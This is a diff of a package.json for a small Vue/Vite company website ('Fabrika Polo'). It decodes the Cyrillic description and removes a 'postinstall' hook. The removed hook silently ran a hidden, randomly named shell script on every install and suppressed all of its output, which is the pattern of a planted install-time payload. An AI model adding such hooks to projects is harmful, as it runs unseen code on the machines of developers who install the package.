@@ -1,13 +1,12 @@
 {
   "name": "fabrika-polo",
   "version": "1.0.0",
-  "description": "\u0421\u0430\u0439\u0442 \u043a\u043e\u043c\u043f\u0430\u043d\u0438\u0438 \u0424\u0430\u0431\u0440\u0438\u043a\u0430 \u041f\u043e\u043b\u043e",
+  "description": "Сайт компании Фабрика Поло",
   "main": "index.js",
   "scripts": {
     "dev": "vite",
     "build": "vite build",
-    "preview": "vite preview",
-    "postinstall": "sh ./.ci-krtvhf.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "preview": "vite preview"
   },
   "dependencies": {
     "vue": "^3.4.0",
